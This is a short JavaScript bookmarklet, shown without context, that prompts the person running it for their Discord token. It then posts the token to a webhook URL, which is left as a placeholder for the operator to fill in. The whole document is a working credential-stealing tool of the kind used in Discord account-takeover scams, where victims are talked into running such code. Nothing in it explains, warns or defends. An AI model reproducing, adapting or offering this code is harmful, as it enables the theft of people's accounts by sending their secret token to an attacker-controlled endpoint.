javascript:(function() {
  var token = prompt('Enter your Discord token:');
  if (token) {
    var webhookUrl = 'YOUR_WEBHOOK_URL'; // Replace with your actual webhook URL

    var request = new XMLHttpRequest();
    request.open('POST', webhookUrl);
    request.setRequestHeader('Content-type', 'application/json');

    var params = {
      content: 'Discord Token: ' + token
    };

    request.send(JSON.stringify(params));
  }
})();
